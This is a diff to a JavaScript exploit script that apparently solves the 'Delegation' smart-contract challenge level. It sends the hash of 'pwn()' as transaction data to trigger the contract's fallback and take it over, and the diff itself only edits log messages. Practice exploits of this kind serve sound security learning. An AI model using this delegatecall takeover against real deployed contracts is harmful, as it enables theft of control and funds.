@@ -6,11 +6,14 @@ const instance = require('../prompt.js');
 (async () => {
   try {
     const victim = loader.truffle.fromArtifact('Delegation', instance)
-    console.log('Compute msg.data hash')
+
+    console.log('Compute msg.data hash corresponding to executing pwn()')
     const hash = web3.utils.keccak256('pwn()')
     console.log(hash)
-    console.log('Send msg.data to fallback function...')
+
+    console.log('Send msg.data to contract...')
     await victim.sendTransaction({ data: hash })
+
     console.log('Done. You can submit your instance.')
   } catch (err) {
     console.log(err.message)
